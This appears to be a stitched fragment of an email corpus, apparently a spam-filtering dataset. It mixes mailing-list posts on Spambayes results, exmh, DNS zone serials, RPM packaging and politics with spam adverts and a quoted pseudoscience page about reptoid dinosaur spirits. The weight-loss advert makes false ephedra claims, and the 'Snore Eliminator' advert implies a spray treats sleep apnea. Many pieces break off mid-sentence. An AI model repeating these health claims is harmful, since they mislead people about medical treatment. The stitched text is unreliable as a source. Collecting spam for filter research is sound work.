 I'd be willing to wager that, his point was merely psychological.
 That there is a distinguishing characteristic (the fantasy) about
 those who are perpetually deluded into a preconceived notion of how
 the world needs to work -- his examples were very clear -- a
 psychopathological individual and on a lesser extreme, the father who
 fantasizes his son as a football player.   I kinda read 'levels' into
 that distinguishing characteristic though.   Meaning, just because
 you believe in the/a fantasy, does not mean necessarily that you're
 going to be an evil terrorist.   It just means you're playing alittle
 game in your head, and because of that you are a bit different from
 the rest of the wavelengths floating around in the cosmos at that
 moment.

 I didn't read cleanse or nonhuman anywhere.   Mind telling me where
 you saw those words?   Sure, I'll bite that the article had rhetoric.
 I'll also bite that he wasn't fair entirely with his theory.   If he
 meant it to be a universal (capable of including even the common
 father with a football complex dream) he should have included our
 delusions in all of this.   But honestly, where in the hell did you
 get 'cleanse ourselves of 'them', the 'non-human' (or lesser-human)

 people.   Lets put some of this moral relativism de jour into
 perspective here.   Al'Qaeda had a fantasy.  This fantasy involved a
 whole mess of 'others' not in their collective fantasy.   This _is_
 much like the mafia's collective fantasy about brotherhood and
 organized crime, or the biker gang's fantasy about being badasses on
 the road or the school board's fantasy about indoctrinating your
 children with Jesus, but its not equivalent.
 
 The terrorists went out, and purposely destroyed things, and killed
 people.   This is bad, I don't care what universe you're in.   While
 the aspect of 'fantasy' can be applied to all groups, and that label
 can be equivalent, the perpetration of the fantasy has different
 effects and must be judged differently.   Otherwise, whats a genocide?
 Just a father-son complex gone terribly awry?
 
 GLM> What if they operate by the same neural-annealing Maxima-Minima
 GLM> gratification mechanisms as you or I and every other creature on this
 GLM> planet?  
 
 They just may, that doesn't dispute that their fantasy was a deadly
 one.
 
 GLM> What if, instead of magically and uniquely alien, they are, just like
 GLM> our own captains and leaders, really only in it for the money, for
 GLM> trade rights-of-way and for power over minions who will foolishly make
 GLM> it all happen, minions whom they can once again dup with /virtually/
 GLM> /identical/ rhetoric ... except we call theirs ""fundamentalist islam"",
 GLM> and they call ours ""imperialist satanism""?
 
 GLM> When both sides can call the other ""evil"" to the cheers of their local
 GLM> public and media, you can bet something's rotten in the state of Denmark.
 
 So your whole point is we too live in a fantasy.  Sure.   No
 questions.  Its the thing that bothered me about the article.   I
 think the difference between our fantasy and theirs, is that there are
 folks out there, in our fantasy allowed to voice their opinons about
 the 'fantasy' and keep folks a bit grounded in the real versus the
 made-up.   From what I gather, there are no such guards, or
 protections on their end.   Thats the problem with some regeimes over
 others.   THey all have bad points -- Ours is in a collective fantasy
 that we need to control the oil, masking the intentions behind a very
 clever, albiet convienent other fantasy of 'terrorism'.   Point is,
 Gary, the 'terrorism' fantasy really happened.  People really died.
 I won't argue we're innocent in the perpetration of our fantasy, but
 I'll argue that we're not just blindly 'cleansing' 'non-humans'.
 
 GLM> I guess that's why I live in the woods.  Bears and racoons I
 GLM> understand, but I really just don't 'get' people.
 
 Too bad bears and racoons don't protect you from the silly fantasies
 of people, yours or others.

836,"Subject: [Spambayes] testing results
","Neil trained a classifier using 3 sets with about 500 ham and spam in each.
 We're missing half his test run results due to a cmp.py bug (since fixed);
 the ""before custom fiddling"" figures on the 3 reported runs were:
 
     false positive percentages
         0.187
         0.749
         0.780
     total unique fp 19
 
     false negative percentages
         2.072
         2.448
         0.574
     total unique fn 43
 
 The ""total unique"" figures counts all 6 runs; it's just the individual-run
 fp and fn percentages we're missing for 3 runs.
 
 Jeremy reported these ""before custom fiddling"" figures on 4 sets with about
 600 ham and spam in each:
 
     false positive percentages
         0.000
         1.398
         1.398
         0.000
         1.242
         1.242
         1.398
         1.398
         0.000
         1.553
         1.553
         0.000
     total unique fp 139
 
     false negative percentages
        10.413
         6.104
         5.027
         8.259
         2.873
         5.745
         5.206
         4.488
         9.336
         5.206
         5.027
         9.874
     total unique fn 970
 
 So things are clearly working much better for Neil.  Both reported
 significant improvements in both f-n and f-p rates by folding in more header
 lines.  Neal added Received analysis to the base tokenizer's header
 analysis, and Jeremy skipped the base tokenizer's header analysis completely
 but added base-subject-line-like but case-folded tokenization for almost all
 header lines (excepting only Received, Data, X-From_, and, I *suspect*, all
 those starting with 'x-vm').
 
 When I try 5 random pairs of 500-ham + 500-spam subsets in my test data, I
 see:
 
     false positive percentages
         0.000
         0.000
         0.200
         0.000
         0.200
         0.000
         0.200
         0.000
         0.000
         0.200
         0.400
         0.000
         0.200
         0.000
         0.200
         0.400
         0.000
         0.400
         0.200
         0.600
     total unique fp 10
 
     false negative percentages
         0.800
         0.400
         0.200
         0.600
         1.000
         0.000
         0.600
         1.200
         1.200
         0.800
         0.400
         0.800
         1.800
         0.800
         0.400
         1.000
         1.000
         0.400
         0.000
         0.600
     total unique fn 36
 
 This is much closer to what Neil saw, but still looks better.  Another run
 on a disjoint 5 random pairs looked much the same; total unique fp rose to
 12 and fn fell to 27; on a third run with another set of disjoint 5 random
 pairs, likewise, with fp 12 and fn 40.  So I'm pretty confident that it's
 not going to matter which random subsets of 500 I take from my data.
 
 It's hard to conclude anything given Jeremy's much worse results.  If they
 were in line with Neil's results, I'd suspect that I've over-tuned the
 algorithm to statistical quirks in my corpora.

","How are you doing?
 
 If you've been like me, you've been trying almost
 EVERYTHING to lose weight. I know how you feel
 - the special diets, miracle pills, and fancy exercise 
 equipment never helped me lose the pounds I needed to lose
 either. It seemed like the harder I worked at it, the less
 weight I lost - until I heard about 'Extreme Power Plus'.
 
 You're probably thinking to yourself, ""Oh geez, not another
 miracle diet pill!"" Like you, I was skeptical at first, but 
 my sister said it helped her lose 23 pounds in just 2 weeks, 
 so I told her I'd give it a try. I mean, there was nothing 
 to lose except a lot of weight! Let me tell you, it was
 the best decision I've ever made.  PERIOD.  Six months later,
 as I'm writing this message to you, I've gone from 355 pounds
 to 210 pounds, and I haven't changed my exercise routine or diet
 at all. Yes, I still eat pizza, and lots of it!
 
 I was so happy with the results that I contacted the manufacturer
 and received permission to resell it - at a HUGE discount.I feel
 the need to help other people lose weight like I did, because it
 does so much for your self-esteem, not to mention your health.
 I am giving you my personal pledge that 'Extreme Power Plus'
 absolutely WILL WORK FOR YOU. 100 % Money-Back GUARANTEED!
 
 If you are frustrated with trying other products, without having 
 any success, and just not getting the results you were promised,
 then I recommend the only product that worked for me - 
 'EXTREME POWER PLUS'!
 
 You're probably asking yourself, ""Ok, so how does this stuff
 actually work?""
 
 Extreme Power Plus contains Lipotropic fat burners and ephedra which 
 is scientifically proven to increase metabolism and cause rapid 
 weight loss. No ""hocus pocus"" in these pills - just RESULTS!!! 
 
 Here is the bottom line ...
 
 I can help you lose 10-15 pounds per week naturally, without
 exercising and without having to eat rice cakes all day. 
 Just try it for one month - there's pounds to lose and confidence 
 to gain! You will lose weight fast - GUARANTEED. This is my

 ***Updating Data Safely with A DataSet, by Alex Homer
 
 OK, so we cant store all three values for a row (the current, original
 and the underlying values) in the tables of our DataSet. Is this actually
 important? What do we actually need to perform the process, and what do
 users actually expect to see? Can we make do with just two values instead
 of three, (and dont you hate books that keep asking questions)?

 Author Interviews
 
 ***With Franois Liger, Craig McQueen and Paul Wilton, authors of Visual
 Basic .NET Text Manipulation Handbook.
 
 [AP] What do you think this book brings to the Visual Basic .NET
 developer, and so who do you think needs this book?
 
 [CM] The book provides a quick easy reference for string programming
 tasks. String manipulation is a large part of programming and it is
 difficult to remember it all. Having an accessible reference assists in
 finding existing code to do the job rather than rewriting something that
 is already in the platform. It's valuable for all .NET developers.
 
 [PW] I think all VB.NET developers need this book. String handling and
 regular expressions are not arcane topics for high-flying gurus - they are
 the stuff of everyday programming! The regular expression chapters give a
 great insight into what at first can seem a tricky topic. In addition the
 regular expression reference at the back of the book is worth its weight
 in gold - certainly more readable than all the documentation I had to work
 with when writing the book.
 
 [AP] In two sentences, explain what strings are in .NET.

 ***With Tobin Titus, author of Visual Basic .NET Threading Handbook
 
 In June, Wrox brought out a slim 260-page volume on threading in VB.NET.
 There has been some confusion as to why we would want to bring a book out
 on what seems a straightforward topic. In this article we interview Tobin
 Titus (one of the authors on this title) and ask him various questions on
 the book, as well getting his opinions on various programming-related
 topics.
 
 What is free threading? 
 
 Free threading is the ability to control execution to the utmost within an
 application. While VB developers have been able to control some aspects of
 threading in the past, they haven't been completely free to control those
 threads in the manner that they desire. Free threading allows the
 developer to make decisions on when a thread should start, when it should
 end, and what it should do while executing.

 this week - we are making this week's code  download \ support material
 available to all non-subscribers (providing they are a member of the Wrox
 Developer Community, which is free to join).
 
 This week's case study: Generating Design Patterns Using CodeDOM 
 http://www.csharptoday.com/content/articles/20020722.asp?&tid026
 
 The Code Document Model (CodeDOM), which provides the ability to generate
 source code in a number of the managed languages, is a very powerful .NET
 facility and has attracted much interest. Within Visual Studio .NET, a
 complementary though unrelated feature is provided by the CodeModel
 object, which allows programmatic access to hand-written code. Together
 these two tools provide a platform from which it should be possible to
 develop a VS.NET add-in to streamline the production of common designs in
 code. This case study follows the development of such a tool, which
 attempts to automate the generation of a widespread design pattern in an
 existing C# or VB.NET project.
 
 
 ***Get on the Fast Track to Success
 
 If you are an experienced programmer who needs to get up to speed on core
 .NET Technologies as quickly as possible, the Fast Track series is for
 you.
 
 The Fast Track books complement our Beginning and Professional series by
 providing concise guides to core topics. They deliver the essential facts
 and understanding that are required to start taking advantage of .NET. By
 targeting specific groups of experienced developers, the books are able to
 concentrate on providing valuable information rather than covering basics.

 tables of our DataSet. Is this actually important? What do we actually need to perform the process, and 
 what do users actually expect to see? Can we make do with just two values instead of three, (and dont

 <b>AUTHOR INTERVIEWS</b>
 <br>
 <br>
 - With <font color=""#CC0000""><b>Franois Liger, Craig McQueen</b></font> and <font color=""#CC0000""><b>Paul Wilston,</b></font> 
 authors of <a href=""http://www.wrox.com/ACON11.asp?ISBN=1861007302&tid027"">Visual Basic .NET Text Manipulation Handbook</a>
 <br>
 <br>
 <b>Q. What do you think this book brings to the Visual Basic .NET developer, and so who do you think needs this book?</b><br><br> 
 
 <font color=""#CC0000"">[CM]</font> The book provides a quick easy reference for string programming tasks. String manipulation is a 
 large part of programming and it is difficult to remember it all. Having an accessible reference assists in finding existing code 
 to do the job rather than rewriting something that is already in the platform. It's valuable for all .NET developers.<br> 
 
 <font color=""#CC0000"">[PW]</font> I think all VB.NET developers need this book. String handling and regular expressions are 
 not arcane topics for high-flying gurus - they are the stuff of everyday programming! The regular expression chapters give a 
 great insight into what at first can seem a tricky topic. In addition the regular expression reference at the back of the book 
 is worth its weight in gold - certainly more readable than all the documentation I had to work with when writing the book.<br> 
 
 <font color=""#CC0000"">[AP]</font> In two sentences, explain what strings are in .NET<br><br>

 <br><br>
 In June, Wrox brought out a slim 260-page volume on threading in VB.NET. There has been some confusion as to why we would want to bring a book out on what 
 seems a straightforward topic. In this article we interview Tobin Titus (one of the authors on this title) and ask him various questions on the book, as 
 well getting his opinions on various programming-related topics.<br><br> 
 
 <b>Q. What is free threading?</b><br><br> 
 
 Free threading is the ability to control execution to the utmost within an application. While VB developers have been able to control some aspects of 
 threading in the past, they haven't been completely free to control those threads in the manner that they desire. Free threading allows the developer 
 to make decisions on when a thread should start, when it should end, and what it should do while executing.<br><br>

 ""Once the Client Component is installed, a server can order a program to run
 on the client. Any CGI script, Java servlet, ASP component, etc. could be
 run on the client. This is like breaking the Web server into two parts.
 Originally, Web servers just understood HTTP and sent pages. Then the field
 started demanding more from the Web and the servers got loaded down with CGI
 and mod_perl and active pages and stuff. So now the Web server can choose to
 go back to simple serving and (where the application is appropriate) let the
 client do the other razzamatazz. This is superior to JavaScript in one
 important detail: the program doesn't have to reload when a new page is
 loaded, as JavaScript functions do.
 
 And because XDegrees uses Web-compatible technology, users can access
 XDegrees resources without installing any software, simply by using their
 browser.""

 ""Scaling is the main question that comes to mind when somebody describes a
 new naming and searching system. CEO Michael Tanne claims to have figured
 out mathematically that the system can scale up to millions of users and
 billions of resources. Scaling is facilitated by the careful location of
 servers (XDegrees will colocate servers at key routing points, as Akamai
 does), and by directing clients to the nearest server as their default
 ""home"" server. Enterprise customers can use own servers to manage in-house
 applications.""
 
 ""Files can be cached on multiple systems randomly scattered around the
 Internet, as with Napster or Freenet. In fact, the caching in XDegrees is
 more sophisticated than it is on those systems: users with high bandwidth
 connections can download portions, or ""stripes,"" of a file from several
 cached locations simultaneously. The XDegrees software then reassembles
 these stripes into the whole file and uses digital signatures to verify that
 the downloaded file is the same as the original. A key component of this
 digital signature is a digest of the file, which is stored as an HTTP header
 for the file.""

 Your actual serial number is 1519761310 - from a dig I've just done.
 
 Try resetting the zone number to 2002082901 - some of your secondaries seem 
 to have a serial number below that, so they clearly regard 1519761310 as 
 being less than 2002082601.
 
 That should enable them to pick up the new zonefile.

847,"Subject: [ILUG] relating data from 2 ascii files ?
","Hi folks,
 Apologies if this is the wrong place to ask, but I am trying to do on my linux desktop what I used to do with some other os software.
 
 I'm trying to use a combination of some bash scripts and some perl to generate reports from a couple of ascii files. Eventually these will run on a server and get the files by ftp, analyse them and mail me the results.
 
 As I'm no programmer (by any stretch of the imagination !) I'm getting a bit lost.
 
 I can deal with single files (eventually) using grep, egrep, awk, and a nice perl script called 'total' which i found while googling.
 
 Problem now is that the data I'm trying to report on is split between two isam files.
 
 File 1 contains
 Docket Number, Line Number, Item, quantity, price, duedate
 
 File 2 contains
 Docket Number, Customer, Shipping date, invoice number.
 
 To make some sense of the data, I need to relate the Docket number between the 2 files, so that I can generate a report by customer.
 
 My first reaction is to look at mysql, and import the ascii data into 2 tables so that I can use sql queries.
 
 Is this the way to go, or should I delve a bit deeper into perl ?
 
 Any advice welcome.
 
 Thanks,
 Declan

849,"Subject: Dinosaurs Eggs and the Origins of Good and Evil
","One of the most bizarre pages I've seen on the Web. At first I thought it
 might be some sort of back-story to a RPG, but, nope, it looks like somebody
 believes this.
 
 ===
 http://www.viking-z.org/r20i.htm
 
 M09. Dinosaurs Eggs and the Origins of Good and Evil.
 DINOSAURS. Reptoid ETs are reported to be 12 foot high crocodiles walking on
 their hind legs. This is a description of a dinosaur. It now appears in
 Remote Viewing that the Reptoid ETs, dinosaurs and dragons are all linked
 together and that they all originated on Earth. The Erideans who are Reptoid
 derivatives have a home planet (in the Eridanus system) like all other ETs.
 The Reptoids have no reported home planet. They also come over as entities
 with little brain who control their bodies directly by spirit. This is a
 description of a ghost or disincarnate entity regardless of how people see
 them. Thus it could be that the Reptoids, Erideans, Nordics, Anunnaki, but
 not the Greys, all have origins on Earth and have a strong link to Earth
 even if they choose to live elsewhere. The Greys do not appear to have a
 renal or urinary system and this points to them not originating on Earth.
 The definitive work on dragons is ""The Flight of Dragons"" by Peter
 Dickinson. If dragons did exist in the flesh, they did not survive the long
 bow. Targets do not come much bigger.
 
 Truth is stranger than fiction. Thus the writer's current scenario is that
 there were a race of dinosaurs which developed psychic intelligence to guard
 their eggs and young, and who probably preferred to live underground. They
 survived the wipe out of the dinosaurs 50 million years ago with difficulty.
 They evolved into the Erideans and transferred to a more hospitable planet
 (for them) possibly with the help of another race of ETs who wanted slaves
 but otherwise had no interest in Earth or mind control.
 
 Thus it appears that the current Reptoids are the Spirits or ghosts of the
 dinosaurs. They must have been powerful to survive 50 million years and also
 to appear to some people. They have appeared to the writer in remote
 viewing. They are living on as vampire entities. Such immortal minds are
 contagious and can easily jump race and species barriers. If they can be
 encouraged to reincarnate, then the power sources of the black magicians and
 mind controllers will disappear. Encouraging them to reincarnate will help
 so called immortal minds to disappear as immortal minds have great
 difficulty surviving reincarnation. Purging people's dinosaurs should remove
 all perverse psychic abilities not under their control. They are a source of
 Satanic Guardian Angels and demons. They control us by owning our psi. Thus
 if we regain ownership of psi, we must relinquish their control and that of
 all other mind controllers. Encourage people to regain ownership of their
 psi.
 
 THE ORIGINS OF LOVE, HATE AND PURE MALICE. The following scenario appears to
 hold water and can account for the origins of our Universal Subconscious.
 
 Dinosaurs laid their eggs and buried them either underground or in piles of
 rotting vegetation (a good source of beetles and grubs for young
 hatchelings). They did not sit on their eggs to keep them warm, which made
 them very vulnerable to drastic climate and temperature change. In order to
 keep away predators some at least developed psychic mind control. To do this
 they had to capture ownership of the psi of potential predators. This is an
 act of hatred and outward looking. While a few dinosaurs did develop the
 ability to bear living young, most did not. The dinosaurs got in first and
 so their mind control tends to override all other latter minds. They have
 become the source of all Satans, devils and demons.
 
 Birds on the other hand developed the ability to sit on their eggs and keep
 them warm. A hen bird normally lays a series of eggs (say one per day) and
 only starts sitting when the clutch is completely laid. Thus all eggs tend
 to hatch together as they all have an equal period of warmth. This is
 primarily an act of love but inward looking. Bearing live young is not
 suitable to a bird of the air. A pregnant pigeon would not fly very far.
 Antarctic penguins tuck a single egg between their legs to keep it warm,
 even if they are standing on ice.
 
 Mammals developed live bearing of their young which is also primarily an act
 of love and inward looking. This is especially true as a mammalian female
 can not desert her young in the womb in case of emergency as can a bird
 sitting on a nest.
 
 Dinosaurs developed hate and mind control of others to protect their young,
 while birds and mammals developed love. Birds and mammals certainly do hate
 all enemies of their young, but this is secondary.
 
 If one wants to purge the sources of malice of say a black magician, then
 purge his dinosaurs and his dinosaur eggs. Unfortunately most of our
 religions are based on dinosaur protection of eggs and thus mind control,
 regardless of the front they put out to the public. Religion tends to
 concentrate on ""How to Brainwash your Neighbour"". Conscious thought has
 built many mighty empires, theologies and slave control systems out of using
 ""How to care for and protect one's young"" as a foundation.
 
 Thus the foulest form of abuse possible is to call something ""A load of
 dinosaur's eggs"". Purging the dinosaurs and dinosaur's eggs of any entity
 tends to purge all malice back to its roots.
 
 It looks as if mighty immortal minds have built up from small beginnings,
 aided and abetted by various occultists and other. As they will insist on
 vampiring the living for energy to avoid reincarnation and disturbing the
 serenity of the writer, he encourages them to reincarnate.
 
 ITEMS FOR INSPECTION. For mind control to take place, then someone must take
 control or ownership of the target's psi and pleasure centres. Check for the
 following.
 
 Nest of dinosaur's eggs, holy dinosaurs, etc.
 Eggs, controllers or owners in peoples psi, pleasure centres, pain killing
 hormones, abilities, etc.
 Mind machines.
 The original engraving or engram.
 GOD and SATAN appear to be job titles and not entities in their own right. T
 hey appear to be dinosaur engravings or engrams. No doubt dinosaurs were the
 first job holders.
 TIMETRACKS are worth investigating as our complete history from the start of
 time.
 
 My, our, Man's timetracks, etc.
 The time tracks of the Universe, Universal Subconscious, Galactic
 Subconscious, etc.
 EXTINCT RACES of ETs can cause problems when they live on in vampire mode.
 Their virtues may known to channelers but they can also have vices. Whenever
 one hears of races which have evolved on to higher planes, suspect that the
 higher plane is a vampire one. One may never know what they looked like or
 other basic characteristics, which makes linking back a trifle difficult.
 Every extinct race, etc.
 BLOOD ANCESTORS are also worth investigating as minds can be passed down via
 genetic linkages. Some of these can be over 2,000 years old.
 Every blood ancestor, ancestral mind, genetic mind, etc.

 It does, but it's not the cost that is causing us to shut it down. The cost
 is a ""minimum $500 per year""... but that only accounts for 18 people
 streaming and playing like 13 or 14 songs an hour. But we could maybe manage
 the 2 cents per person, per 100 songs.
 
 The problem comes with the record keeping they mandate with webstreaming.
 Start and end times for every song (not too hard), artist (okay), title
 (okay), composers (a little harder), serial number (wtf??). I think there
 are a few more things they wanted, but honestly, programming this info in
 for every song that we play is ridiculous. This means we'd also have to get
 all the DJs to find this info and write it down any time they play a
 request, vinyl, or CDs not loaded into the computer. It's ridiculous and
 nearly impossible...
 
 We would need someone to sit in the studio 24/7 writing down all this info -
 which sometimes isn't available, like from earlier album that don't have
 serial numbers and barcodes. Then still if only the magic 18 people
 webstream our signal, the price would become quite exponential since we play
 on average 16 songs an hour, we'd be paying $22.11 everyday to stream to
 those 18 people. So really, it does have to do with the internet tax, but it
 is a few reasons together why we can't do it after their kill-date. :(

 Until this patch, exmh was full of hardcoded references to unseen.  One of the 
 things I did was to change these to look in the already available global 
 variable with the value in it (which other parts of the code did use).
 
 Anyway, I've just fixed the performance problem with repeatedly reading the 
 sequences files.  I'll patch it in after I've run it for a while.

 The government prevents me from hunting them down and flossing with 
 their sinew after I'm done with them. Sometimes I wish for a return to

 Despite being the author of SpamAssassin, I've never fixed exmh to do
 this.  I am therefore clearly not an exmh hacker ;)
 
 But to simplify -- the first action is piping the message to an external
 command, then replacing the message file with the output; and the second
 is simply piping the message to another command, then ignoring the output.
 I'd say it's easy enough to do, if someone can provide the tcl.

 For all my recent packages that support --with and --without options, I've
 put them in the %description section. See for instance :
 http://psyche.freshrpms.net/rpm.html?id=80
 
 Where you can see :
 Available rpmbuild rebuild options :
 --with : alsa
 --without : aalib lirc libdv arts
 
 The ogle package has also a --with alsa option, and I've had a bug report
 about xine that I apparently unintentionally compiled with ALSA directly
 :-/
 
 I'd like to aks this on the rpm-zzzlist : Would a new dependency of 250k, the
 alsa-lib package, for many packages (mplayer, ogle, xine) be a problem for
 the freshrpms.net packages users? As I really feel like blending ALSA in
 now, especially since I've just spent some time recompiling alsa-kernel
 package for all the Psyche kernels!!!

 <p>How the Snore Eliminator will help you!</p>
 <b>
 <p>What Causes Snoring?</p>
 </b></font><font FACE=""MS Sans Serif"" COLOR=""#0000a0"">
 <p>Over-relaxed throat and tongue muscles due to poor throat muscle</p>
 <p>Excessive fat on the throat</p>
 <p>Accumulation of secretion in the back of the throat and</p>
 <p>Throat swelling from allergies and food</p>
 <p>Heavy snoring is often associated with apnea, or the </font><font FACE=""MS Sans Serif"" COLOR=""#800040"">stopping
 of breathing, </font><font FACE=""MS Sans Serif"" COLOR=""#0000a0"">during sleep. As
 an individuals sleeps his or her sleeping pattern is disrupted and fragmented
 due to snoring, thus they are never well rested. This can be a very hazardous
 problem if someone is not getting proper REM sleep. Snoring is the audible
 symptom of a <b>blocked airway during sleep.</p>
 </b>
 <p>The noise is caused by a vibration in the soft palate as the lungs pull hard
 to take in a <b>weakened current of incoming air. </b>This blockage may result
 from any number of circumstances, and these offer clues to get rid of the
 problem.</p>
 <p>Snoring is also more than likely to occur among people who <b>sleep on their
 backs</b>; the tongue falls back toward the throat and partly closes the airway.</p>
 </font><b><font FACE=""MS Sans Serif"" COLOR=""#800040"">
 <p>The hidden dangers of snoring?</p>
 </font><font FACE=""MS Sans Serif"" COLOR=""#0000a0"">
 <blockquote>
   <blockquote>
   </font></b><font FACE=""MS Sans Serif"" COLOR=""#0000a0"">
 <p>Snoring could increase the chances of a heart attack if not treated</p>
 <p>Hypertension and increased anxiety are associated with snoring</p>
 <p>Snoring causes sleep apnea a serious treatable medical condition</p>
 </blockquote>
 </blockquote>
 </font><b><font FACE=""MS Sans Serif"" COLOR=""#800040"">
 <p>Snoring decreases sexual performance</font></b><font FACE=""MS Sans Serif"" COLOR=""#800040"">
 </font><font FACE=""MS Sans Serif"" COLOR=""#0000a0"">by half, due to lack of oxygen
 to the brain which decreases sexual responsiveness.</p>
 <p>Most people who snore have a </font><b><font FACE=""MS Sans Serif"" COLOR=""#800040"">shortage
 of oxygen</font></b><font FACE=""MS Sans Serif"" COLOR=""#0000a0""> for a
 significant portion of that person's life. In recent studies, daytime fatigue
 and cardiovascular disorder are related to snoring. In a few cases, heavy
 snoring is a sign of potentially life -threatening problem. Sleep apnea in which
 breathing stops for a second or even minutes at a time and finally resumes with
 snorting and tossing around. This pattern may be repeated hundreds of times all
 night long. The result is chronic oxygen shortage, which leads to abnormal heart
 rhythms, high blood pressure, and heart strain.</p>
 </font><b><font FACE=""MS Sans Serif"" COLOR=""#800040"">
 <p>How the Snore Eliminator works!</p>
 </font></b><font FACE=""MS Sans Serif"" COLOR=""#0000a0"">
 <p>Snore Eliminator offers a unique break through with its all </font><font FACE=""MS Sans Serif"" COLOR=""#800040"">natural
 enzymes</font><font FACE=""MS Sans Serif"" COLOR=""#0000a0""> which metabolize the
 secretions, allowing the body to absorb them into the back of the throat. The
 herbs reduce tissue swelling. The result is to open the airway and smooth the
 airflow. This in turn eliminates the snoring for hours at a time. It also</font><b><font FACE=""MS Sans Serif"" COLOR=""#800040"">
 reduces the noise</font></b><font FACE=""MS Sans Serif"" COLOR=""#800040""> made by
 breathing through the mouth while sleeping</font><font FACE=""MS Sans Serif"" COLOR=""#0000a0"">.
 By simply spraying the back of the throat, tongue and uvula with our special
 formula, manufactured using our patented break through process, the soft tissue
 is coated. This allows the<b> </b></font><b><font FACE=""MS Sans Serif"" COLOR=""#800040"">throat
 a chance to relax</font></b><font FACE=""MS Sans Serif"" COLOR=""#0000a0""> thus a
 reduced amount of snoring. In most cases snoring is eliminated. Snore Eliminator
 coats the throat area with a unique patented process of all natural lubricants.</p>

 <p>I am having a good nights sleep, finally. I used to wake myself up during the
 night which was a real bummer as I would not always go back to sleep. Sleeping
 through the night is great. Thanks a lot Snore Eliminator.</p>
 <p>PS: My girlfriend loves it as much or more than I do.</p>
 <p>Alex writes...</p>
 <p>My husband uses it for another reason. He has a problem with blocked nasal
 passages. While he's asleep the passages close, he stops breathing and he wakes
 up gasping. When he takes Snore Eliminator his nose stays clearer and he's able
 to sleep more restfully.</p>
 <p>Thank you for a product that has really helped us!</p>
 <p>Glen writes...</p>
 <p>In February 1995, I was diagnosed with severe sleep apnea. A CPAP was the
 suggested treatment for my affliction, but it did not help my condition. I heard
 your advertisement and ordered a bottle of Snore Eliminator and my sleep
 improved immediately. I continue to use it and my sleep has been better than it
 had been in years. Thanks.</p>

"," I decided to try out GarGnome, to see what gnome2 looks like. It's
 pretty, I'll give it that.
 
  However, there seemed to be loads of bugs - sawfish threw wobblers all
 over the place, so I tryed out metacity - which doesn't have a GUI
 configurator, and arsed if I'm going back to the fvwm days when you had to
 set settings by hand, without an idea what the values looked like.
 
  So, I went back to 1.4 - and now sawfish can't start applets (yes, I did
 change the LD_LIBRARY_PATH back) and the panel can't make new workspaces.
 
  Any ideas what could have happened ? Would sawfish 2.0 silently change
 the config files & break them?

 That's not what the First Amendment says at all. It says that Congress cannot 
 say what can't be FoRKed. FoRK can establish any rules it wants. Similarly, 
 The New York Times gets to choose what news IT thinks is ""fit to print."" If 
 the Times chose not to print anything about, say, Rosie O'Donnell, it would 
 be exercising its First Amendment rights, just as much as it would be if it 
 chose to print something Rosie O'Donnell doesn't like. The necessary 
 corollary of the freedom to say/publish what one wants is the freedom to 
 refuse to publish or say what one doesn't like. The alternative is a 
 state-controlled press that reprints government press releases and calls them 
 news.
 
 The question of what is or is not FoRKed is (except for libel or other 
 specific exceptions) not a matter of law, but a matter of what the 
 ""publisher"" (if any) decides or the ""community"" (if any) negotiates or does 
 as a matter of custom.
 
 For my part, I'd rather people didn't use FoRK as a place in which to dump an 
 expression of their political beliefs.

 Forwarding me stuff from a list is hardly handing me a job. I tracked them
 down, they dont exist anymore, like 99% of the things I track down the req's
 are pulled or there is a freeze.
 
 The real problem is you cant even train for jobs now, since they _demand_
 7-10 years at a job paid to do the wierd collection of skills they want.
 
 But I'll get lucky eventually and someone I know will be a hiring manager.

879,"Subject: Kissinger
","
 [can't think of how I'd be running
 afoul of the spam filters with this
 post, so here's the second try...]
 
 Kissinger's book _Does America Need
 a Foreign Policy?_ provides a few
 handy abstractions:
 
 > The ultimate dilemma of the statesman is to strike a balance between
 > values [""idealism""] and interests [""realism""] and, occasionally,
 > between peace and justice.
 
 Also, he views historical American
 approaches to foreign policy as a
 bundle of three fibers:
 
 Hamiltonian - We should only get
   involved in foreign adventures
   to preserve balances of power.
 
 Wilsonian - We should only get
   involved in foreign adventures
   to further democracy, etc.
 
 Jacksonian - We should never get
   involved in foreign adventures.
   Unless we're attacked.  Then we
   go Rambo.
 
 He has tactfully left out the hard
 realists*; as for the rest I gather
 wilsonians play the idealists, and
 hamiltonians act where values and
 interests intersect, and jacksonians 
 act only when values and interests
 overlap.
 
 Kissinger himself seems to be a
 Hamiltonian; much of the book is
 about how he thinks we ought to
 be shaping the balance of power
 in various foreign regions.
 
 Maybe I've been too affected by
 Kant, but I can't see that such
 a strategy works unless one can
 count on a Bismarck runnning it:
 how lopsided does the US look if
 everyone tries to run a balance
 of power politics?

 Kings and tyrants generically have
 followed the same power politics:
 garner popular support by keeping
 potential oligarchs down.  In other
 traditions, a king is a legitimate
 tyrant, and a tyrant an illegitimate
 king.  In the US, I'd hope that we,
 like Samuel, wouldn't naturally make
 such fine distinctions.

880,"Subject: Changed location of incoming mail. exmh not working!!
","I use exmh 2.5 with procmail for presorting incoming mail and move it to
 the relevant folder using rcvstore.
 
 Recently, my incoming mail (or spool) location moved to another disk.
 I'm not quite clear how to reconfigure procmail/rcvstore/exmh to accept
 mail from the new location.
 
 There seems to be a variable in exmh-defaults (bgspool). It says at the
 top of the file not to edit these lines. So, I went ahead and edited it :-)
 That does not make a difference.
 
 It seems like procmail is the one that is actually reading the mail from
 my spool/incoming mail area and piping it to rcvstore. So, I need to
 configure that probably.
 
 Any idea how I would do this?
 
 Thanks
 Siva

 Here is the bug I opened:
 
   http://www.hughes-family.org/bugzilla/show_bug.cgi?id=762
 
 RBLs have the same problem, but there is no negative RBL header rule
 with a -20 score that can be forged, so the problem is unique to Habeas.
 
 > Since I can set up spamassassin to I don't ""lose"" any email, what do I

 My primary issue is the magnitude of the negative score and that it was
 not determined empirically.  I am also concerned that it was added after
 the rules freeze, that such a major change was not discussed in advance,
 etc.
 
 There's also no evidence that the rule will actually reduce FPs.  People
 who are smart enough to use the rule are probably capable of writing
 email that doesn't look like spam (I'm not counting spam mailing lists
 which you need to be exempted from spam filtering).

 Sure - discussion in Forbes - rigorous research, that. Especially when 
 the data in their own list
 contradicts them. I continue to look at the list and all the ""inherited,

 Its interesting but in this part of the World (Nova Scotia) a recent 
 study found that college graduates
 earn less than graduates of 2 year community colleges (trade schools). 
 They did decline to mention
 that the demand for some trades  is so great that some of
 them are demanding university degrees to get in. Just for the record - 
 the average salary for
 a university graduate (including advanced degree holders) here is C$ 
 21,000  -- < $14,000 US. No wonder
 half of San Francisco has set up here - we have a whole whack of call 
 centers that
 have arrived here in the last couple of years - I think they hire some 
 entry level IT people for around $10 ($6 US) an
